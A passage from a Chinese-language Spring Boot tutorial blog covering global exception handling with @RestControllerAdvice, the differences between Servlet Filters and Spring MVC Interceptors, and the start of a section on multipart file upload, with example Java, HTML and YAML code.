org.springframework.web.bind.MethodArgumentNotValidException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ExceptionHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestControllerAdvice;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理自定义的业务异常 (例如，资源未找到)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(ResourceNotFoundException.class)</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.NOT_FOUND)</span> <span class="comment">// 直接指定HTTP状态码</span></span><br><span class="line">    <span class="keyword">public</span> ErrorResponse <span class="title function_">handleResourceNotFoundException</span><span class="params">(ResourceNotFoundException ex)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ErrorResponse</span>(<span class="number">404</span>, ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理参数校验异常 (<span class="doctag">@Valid</span>)</span></span><br><span class="line"><span class="comment">     * 这是最常用的异常处理之一</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(MethodArgumentNotValidException.class)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Map&lt;String, String&gt;&gt; <span class="title function_">handleValidationExceptions</span><span class="params">(MethodArgumentNotValidException ex)</span> &#123;</span><br><span class="line">        Map&lt;String, String&gt; errors = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        ex.getBindingResult().getFieldErrors().forEach(error -&gt; </span><br><span class="line">            errors.put(error.getField(), error.getDefaultMessage())</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;&gt;(errors, HttpStatus.BAD_REQUEST);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理其他所有未被捕获的系统级异常 (兜底方案)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(Exception.class)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;ErrorResponse&gt; <span class="title function_">handleGlobalException</span><span class="params">(Exception ex)</span> &#123;</span><br><span class="line">        <span class="comment">// 在实际项目中，这里应该记录详细的错误日志</span></span><br><span class="line">        <span class="comment">// log.error(&quot;Unhandled exception occurred&quot;, ex); </span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 向客户端返回一个通用的、模糊的错误信息，隐藏内部细节</span></span><br><span class="line">        <span class="type">ErrorResponse</span> <span class="variable">errorResponse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorResponse</span>(<span class="number">500</span>, <span class="string">&quot;Internal Server Error. Please contact support.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;&gt;(errorResponse, HttpStatus.INTERNAL_SERVER_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义的错误响应体结构</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">        <span class="keyword">private</span> String message;</span><br><span class="line">        <span class="comment">// constructor, getters, setters</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 自定义的业务异常类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ResourceNotFoundException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ResourceNotFoundException</span><span class="params">(String message)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="4-工作流程"><a href="#4-工作流程" class="headerlink" title="4. 工作流程"></a>4. 工作流程</h5><ol>
<li>当任何一个 <code>@Controller</code> 的方法在执行过程中抛出一个<strong>未被<code>try-catch</code>捕获</strong>的异常时，该异常会被Spring MVC的 <code>DispatcherServlet</code> 捕获。</li>
<li><code>DispatcherServlet</code> 会查找所有已注册的 <code>@ControllerAdvice</code> Bean。</li>
<li>它会遍历这些Advice类中的所有 <code>@ExceptionHandler</code> 方法，寻找一个<strong>最匹配</strong>当前抛出异常类型的处理方法。<ul>
<li><strong>匹配规则</strong>: 优先选择最精确匹配的异常类型。例如，如果抛出的是 <code>ResourceNotFoundException</code>，它会优先匹配 <code>handleResourceNotFoundException</code>，而不是更通用的 <code>handleGlobalException</code>。</li>
</ul>
</li>
<li>一旦找到匹配的处理方法，Spring MVC就会调用该方法。</li>
<li>该方法的返回值（通常是一个 <code>ResponseEntity</code> 或被 <code>@ResponseStatus</code> 标记的对象）会被用来构建最终的HTTP响应，返回给客户端。</li>
</ol>
<hr>
<h5 id="5-优势总结"><a href="#5-优势总结" class="headerlink" title="5. 优势总结"></a>5. 优势总结</h5><ol>
<li><strong>代码解耦和集中化</strong>: 将异常处理逻辑从业务代码（Controller）中完全分离出来，避免了在每个Controller方法中都写<code>try-catch</code>块，使得业务代码更纯粹、更专注于其核心职责。</li>
<li><strong>统一的错误响应格式</strong>: 确保了无论发生何种错误，API返回给客户端的错误信息都遵循统一的、预先定义好的结构，极大地简化了前端的处理逻辑。</li>
<li><strong>提升安全性</strong>: 避免了直接暴露系统内部的堆栈信息，只向外部提供有意义的、安全的错误提示。</li>
<li><strong>可维护性高</strong>: 当需要修改错误处理逻辑或错误响应格式时，只需修改全局异常处理器这一个地方即可。</li>
</ol>
<p><strong>最佳实践</strong>: 在任何生产级的Spring Boot项目中，都应该实现一个健壮的 <code>GlobalExceptionHandler</code>，它至少应该能处理：</p>
<ul>
<li><strong>参数校验异常</strong> (<code>MethodArgumentNotValidException</code>)</li>
<li><strong>自定义的业务异常</strong> (继承自 <code>RuntimeException</code>)</li>
<li><strong>一个通用的 <code>Exception</code> 兜底处理器</strong></li>
</ul>
<hr>
<h4 id="1-5-2-过滤器-Filter-vs-拦截器-Interceptor"><a href="#1-5-2-过滤器-Filter-vs-拦截器-Interceptor" class="headerlink" title="1.5.2 过滤器 (Filter) vs 拦截器 (Interceptor)"></a>1.5.2 过滤器 (Filter) vs 拦截器 (Interceptor)</h4><h5 id="1-过滤器-Filter"><a href="#1-过滤器-Filter" class="headerlink" title="1. 过滤器 (Filter)"></a><strong>1. 过滤器 (Filter)</strong></h5><h6 id="a-核心定义与归属"><a href="#a-核心定义与归属" class="headerlink" title="a. 核心定义与归属"></a><strong>a. 核心定义与归属</strong></h6><ul>
<li><strong>归属</strong>: <strong>Servlet规范</strong> 的一部分，定义在 <code>javax.servlet.Filter</code> 接口中。</li>
<li><strong>定位</strong>: 它是Java Web技术栈中的一个<strong>底层</strong>组件，不依赖于任何特定的Web框架（如Spring MVC）。理论上，任何实现了Servlet规范的Web容器（如Tomcat, Jetty）都支持Filter。</li>
<li><strong>工作层面</strong>: 工作在 <strong>Servlet容器层面</strong>，在请求进入 <code>DispatcherServlet</code> <strong>之前</strong>，以及响应从 <code>DispatcherServlet</code> 返回 <strong>之后</strong>被调用。</li>
</ul>
<h6 id="b-工作流程"><a href="#b-工作流程" class="headerlink" title="b. 工作流程"></a><strong>b. 工作流程</strong></h6><p>Filter构成了一个<strong>责任链 (Chain of Responsibility)</strong>。一个请求在到达目标Servlet（在Spring MVC中就是<code>DispatcherServlet</code>）之前，会依次穿过这个链上的所有Filter。</p>
<p><strong>请求流程</strong>:</p>
<p><code>Request</code> -&gt; <code>Filter1.doFilter()</code> -&gt; <code>Filter2.doFilter()</code> -&gt; … -&gt; <code>DispatcherServlet</code></p>
<p><strong>响应流程</strong>:</p>
<p><code>Request</code> &lt;- <code>Filter1.doFilter()</code> &lt;- <code>Filter2.doFilter()</code> &lt;- … &lt;- <code>DispatcherServlet</code></p>
<p><code>doFilter(ServletRequest, ServletResponse, FilterChain)</code> 方法是其核心：</p>
<ul>
<li>在 <code>chain.doFilter(request, response)</code> <strong>之前</strong>的代码，是在<strong>请求处理前</strong>执行的。</li>
<li><code>chain.doFilter(request, response)</code> 这行代码的作用是将请求<strong>传递给链中的下一个Filter</strong>，如果已经是最后一个Filter，则传递给目标Servlet。</li>
<li>在 <code>chain.doFilter(request, response)</code> <strong>之后</strong>的代码，是在<strong>响应返回时</strong>执行的。</li>
</ul>
<h6 id="c-实现方式-在Spring-Boot中"><a href="#c-实现方式-在Spring-Boot中" class="headerlink" title="c. 实现方式 (在Spring Boot中)"></a><strong>c. 实现方式 (在Spring Boot中)</strong></h6><ol>
<li>创建一个类实现 <code>javax.servlet.Filter</code> 接口。</li>
<li>使用 <code>@Component</code> 将其注册为Bean，Spring Boot会自动发现并配置它。</li>
<li>可以使用 <code>@Order</code> 注解来指定多个Filter之间的执行顺序（值越小，优先级越高）。</li>
</ol>
<p><strong>示例：一个简单的日志Filter</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(1)</span> <span class="comment">// 设置执行顺序为1</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoggingFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;Filter: Request received for URL: &quot;</span> + req.getRequestURI());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将请求传递下去</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">duration</span> <span class="operator">=</span> System.currentTimeMillis() - startTime;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter: Request processed in &quot;</span> + duration + <span class="string">&quot; ms.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// init() 和 destroy() 方法可以留空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="d-功能与适用场景"><a href="#d-功能与适用场景" class="headerlink" title="d. 功能与适用场景"></a><strong>d. 功能与适用场景</strong></h6><p>由于Filter工作在非常靠前的位置，它能够：</p>
<ul>
<li><strong>修改请求和响应对象</strong>: 在请求到达Servlet之前，可以替换或包装 <code>HttpServletRequest</code> 和 <code>HttpServletResponse</code> 对象。</li>
<li><strong>访问原始的HTTP信息</strong>: 可以获取到最原始的请求数据，不受任何框架处理。</li>
<li><strong>进行请求拦截与重定向</strong>: 在 <code>chain.doFilter()</code> 调用之前，可以直接中断请求流程，例如进行重定向或返回错误响应。</li>
</ul>
<p><strong>适用场景</strong>:</p>
<ul>
<li><strong>全局编码转换</strong>: 如设置所有请求和响应的字符编码为UTF-8。</li>
<li><strong>XSS&#x2F;CSRF防护</strong>: 对所有请求的参数进行安全过滤。</li>
<li><strong>GZIP压缩</strong>: 对响应内容进行压缩。</li>
<li><strong>实现CORS跨域</strong>: 在响应中添加CORS相关的头信息。</li>
<li><strong>记录所有请求的访问日志 (Access Log)</strong>。</li>
</ul>
<hr>
<h5 id="2-拦截器-Interceptor"><a href="#2-拦截器-Interceptor" class="headerlink" title="2. 拦截器 (Interceptor)"></a><strong>2. 拦截器 (Interceptor)</strong></h5><h6 id="a-核心定义与归属-1"><a href="#a-核心定义与归属-1" class="headerlink" title="a. 核心定义与归属"></a><strong>a. 核心定义与归属</strong></h6><ul>
<li><strong>归属</strong>: <strong>Spring MVC框架</strong> 的一部分，定义在 <code>org.springframework.web.servlet.HandlerInterceptor</code> 接口中。</li>
<li><strong>定位</strong>: 它是Spring MVC<strong>专属</strong>的组件，依赖于Spring的IoC容器。</li>
<li><strong>工作层面</strong>: 工作在 <strong>Spring MVC框架层面</strong>，在请求进入 <code>DispatcherServlet</code> <strong>之后</strong>，但在 <code>Controller</code> 的方法被调用 <strong>之前&#x2F;之后</strong>被调用。</li>
</ul>
<h6 id="b-工作流程-1"><a href="#b-工作流程-1" class="headerlink" title="b. 工作流程"></a><strong>b. 工作流程</strong></h6><p>拦截器提供了更精细的控制点，它有三个核心方法：</p>
<ol>
<li><strong><code>preHandle(request, response, handler)</code></strong>:<ul>
<li><strong>调用时机</strong>: 在 <code>HandlerAdapter</code> 调用 <code>Controller</code> 方法<strong>之前</strong>执行。</li>
<li><strong>返回值</strong>: 返回 <code>true</code> 表示继续执行后续的拦截器和Controller；返回 <code>false</code> 表示<strong>中断请求</strong>，后续的拦截器和Controller都不会被执行。</li>
<li><strong>用途</strong>: 主要用于<strong>权限认证、登录校验</strong>等。</li>
</ul>
</li>
<li><strong><code>postHandle(request, response, handler, modelAndView)</code></strong>:<ul>
<li><strong>调用时机</strong>: 在 <code>Controller</code> 方法<strong>执行之后</strong>，但在<strong>视图渲染之前</strong>执行。</li>
<li><strong>用途</strong>: 可以在视图渲染前，对<strong>模型数据 (<code>ModelAndView</code>) 进行修改</strong>或添加公共的属性。</li>
</ul>
</li>
<li><strong><code>afterCompletion(request, response, handler, ex)</code></strong>:<ul>
<li><strong>调用时机</strong>: 在整个请求处理完成（包括<strong>视图渲染之后</strong>）执行。</li>
<li><strong>用途</strong>: 主要用于<strong>资源清理</strong>、<strong>记录异常日志</strong>、<strong>性能监控</strong>等。无论请求处理过程中是否发生异常，这个方法<strong>都会被调用</strong>（前提是<code>preHandle</code>返回<code>true</code>）。</li>
</ul>
</li>
</ol>
<h6 id="c-实现方式-在Spring-Boot中-1"><a href="#c-实现方式-在Spring-Boot中-1" class="headerlink" title="c. 实现方式 (在Spring Boot中)"></a><strong>c. 实现方式 (在Spring Boot中)</strong></h6><ol>
<li>创建一个类实现 <code>HandlerInterceptor</code> 接口。</li>
<li>创建一个配置类实现 <code>WebMvcConfigurer</code> 接口。</li>
<li>重写 <code>addInterceptors(InterceptorRegistry registry)</code> 方法，将自定义的拦截器注册到Spring MVC中，并可以指定要拦截的URL路径模式。</li>
</ol>
<p><strong>示例：一个简单的认证拦截器</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 实现 HandlerInterceptor</span></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token != <span class="literal">null</span> &amp;&amp; token.equals(<span class="string">&quot;valid-token&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Interceptor: Authentication passed.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 放行</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Interceptor: Authentication failed.&quot;</span>);</span><br><span class="line">            response.setStatus(<span class="number">401</span>); <span class="comment">// 设置未授权状态码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 中断请求</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 注册 Interceptor</span></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AuthInterceptor authInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(authInterceptor)</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/api/**&quot;</span>) <span class="comment">// 指定拦截以/api/开头的路径</span></span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/api/login&quot;</span>); <span class="comment">// 排除登录接口</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="d-功能与适用场景-1"><a href="#d-功能与适用场景-1" class="headerlink" title="d. 功能与适用场景"></a><strong>d. 功能与适用场景</strong></h6><p>由于拦截器工作在Spring MVC内部，它能够：</p>
<ul>
<li><strong>访问到处理器信息</strong>: <code>preHandle</code> 方法的 <code>handler</code> 参数是 <code>HandlerMethod</code> 对象，可以获取到即将要调用的Controller、方法、方法上的注解等详细信息。</li>
<li><strong>访问和修改<code>ModelAndView</code></strong>: 在 <code>postHandle</code> 中可以修改即将渲染到视图的数据。</li>
<li><strong>利用Spring的IoC容器</strong>: 拦截器本身就是一个Bean，可以方便地注入其他Service等Bean来执行复杂的业务逻辑。</li>
</ul>
<p><strong>适用场景</strong>:</p>
<ul>
<li><strong>用户登录状态校验</strong>。</li>
<li><strong>接口权限验证</strong>。</li>
<li><strong>向<code>Model</code>中添加公共数据</strong>（如网站的全局导航信息）。</li>
<li><strong>记录接口的调用日志</strong>（包含哪个Controller的哪个方法被调用）。</li>
<li><strong>性能监控</strong>（计算Controller方法的执行时间）。</li>
</ul>
<hr>
<h5 id="3-总结与对比"><a href="#3-总结与对比" class="headerlink" title="3. 总结与对比"></a>3. 总结与对比</h5><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">过滤器 (Filter)</th>
<th align="left">拦截器 (Interceptor)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>归属</strong></td>
<td align="left"><strong>Servlet规范</strong>，不依赖Spring</td>
<td align="left"><strong>Spring MVC框架</strong>的一部分，依赖Spring</td>
</tr>
<tr>
<td align="left"><strong>执行时机</strong></td>
<td align="left">在<code>DispatcherServlet</code><strong>之前&#x2F;之后</strong>，更靠前</td>
<td align="left">在<code>Controller</code>方法<strong>之前&#x2F;之中&#x2F;之后</strong>，更靠后</td>
</tr>
<tr>
<td align="left"><strong>控制粒度</strong></td>
<td align="left"><strong>粗粒度</strong>。只能访问原始的<code>Request</code>和<code>Response</code>。</td>
<td align="left"><strong>细粒度</strong>。可以访问<code>HandlerMethod</code>、<code>ModelAndView</code>等框架内部对象。</td>
</tr>
<tr>
<td align="left"><strong>功能范围</strong></td>
<td align="left">能处理所有进入Servlet容器的请求，包括<strong>静态资源</strong>。</td>
<td align="left"><strong>只能处理</strong>经过<code>DispatcherServlet</code>的请求，默认不处理静态资源。</td>
</tr>
<tr>
<td align="left"><strong>依赖注入</strong></td>
<td align="left">本身是Bean，可以注入其他Bean，但无法直接获取Spring MVC上下文信息。</td>
<td align="left">本身是Bean，可以方便地注入Service等，并能获取Spring MVC上下文。</td>
</tr>
<tr>
<td align="left"><strong>典型用途</strong></td>
<td align="left">编码、CORS、安全过滤、GZIP压缩</td>
<td align="left">登录校验、权限控制、日志记录、性能监控</td>
</tr>
</tbody></table>
<p><strong>一句话总结</strong>:</p>
<ul>
<li>如果你想做一些<strong>与框架无关</strong>的、<strong>针对所有HTTP请求</strong>的底层操作，请使用<strong>过滤器 (Filter)</strong>。</li>
<li>如果你想做一些<strong>与Spring MVC应用相关</strong>的、<strong>需要访问Controller或模型数据</strong>的精细化控制，请使用<strong>拦截器 (Interceptor)</strong>。</li>
</ul>
<hr>
<h4 id="1-5-3-文件上传与下载"><a href="#1-5-3-文件上传与下载" class="headerlink" title="1.5.3 文件上传与下载"></a>1.5.3 文件上传与下载</h4><p>Spring Boot 对文件上传进行了自动配置，使得处理上传文件变得非常简单。核心是使用 <code>MultipartFile</code> 接口来接收上传的文件数据。</p>
<h5 id="1-文件上传"><a href="#1-文件上传" class="headerlink" title="1. 文件上传"></a>1. 文件上传</h5><h6 id="a-前端准备-HTML-Form"><a href="#a-前端准备-HTML-Form" class="headerlink" title="a. 前端准备 (HTML Form)"></a>a. 前端准备 (HTML Form)</h6><p>要实现文件上传，前端的HTML表单必须满足三个条件：</p>
<ol>
<li><code>method</code> 必须是 <strong><code>POST</code></strong>。</li>
<li><code>enctype</code> (encoding type) 必须设置为 <strong><code>multipart/form-data</code></strong>。这告诉浏览器要以二进制的形式分段上传数据，而不是普通的文本。</li>
<li><code>input</code> 标签的 <code>type</code> 必须是 <strong><code>file</code></strong>。</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>File Upload Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Upload a Single File<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/upload/single&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Upload<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Upload Multiple Files<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/upload/multiple&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &#x27;multiple&#x27; attribute allows selecting multiple files --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;files&quot;</span> <span class="attr">multiple</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Upload<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h6 id="b-Spring-Boot-配置-application-yml"><a href="#b-Spring-Boot-配置-application-yml" class="headerlink" title="b. Spring Boot 配置 (application.yml)"></a>b. Spring Boot 配置 (application.yml)</h6><p>Spring Boot 允许你配置一些文件上传的限制，这对于防止恶意的大文件上传非常重要。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">multipart:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># 默认开启</span></span><br><span class="line">      <span class="comment"># 单个文件的最大大小，默认1MB</span></span><br><span class="line">      <span class="attr">max-file-size:</span> <span class="string">10MB</span></span><br><span class="line">      <span class="comment"># 单次请求的总文件大小，默认10MB</span></span><br><span class="line">      <span class="attr">max-request-size:</span> <span class="string">100MB</span></span><br><span class="line">      <span class="comment"># 文件写入磁盘的阈值，超过这个大小会先写入临时文件，默认0</span></span><br><span class="line">      <span class="comment"># file-size-threshold: 2KB</span></span><br><span class="line">      <span class="comment"># 上传文件的临时存储目录</span></span><br><span class="line">      <span class="comment"># location: /path/to/temp</span></span><br></pre></td></tr></table></figure>

<hr>
<h6 id="c-后端Controller实现"><a href="#c-后端Controller实现" class="headerlink" title="c. 后端Controller实现"></a>c. 后端Controller实现</h6><p>在Controller中，我们使用 <code>@RequestParam</code> 注解，并将参数类型声明为 <code>MultipartFile</code> 或 <code>MultipartFile[]</code> 来接收文件。</p>
